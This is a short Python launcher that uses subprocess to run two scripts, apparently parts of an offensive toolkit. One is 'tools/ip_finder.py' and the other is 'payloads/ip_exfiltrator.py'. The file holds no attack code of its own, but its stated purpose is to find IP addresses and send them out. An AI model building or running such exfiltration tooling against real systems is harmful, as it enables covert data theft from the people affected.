import subprocess
import os

def main():
    # Run the IP finder
    ip_finder_path = os.path.join(os.path.dirname(__file__), "tools", "ip_finder.py")
    subprocess.run(["python3", ip_finder_path])

    # Run the IP exfiltrator
    ip_exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "ip_exfiltrator.py")
    subprocess.run(["python3", ip_exfiltrator_path])

if __name__ == "__main__":
    main()
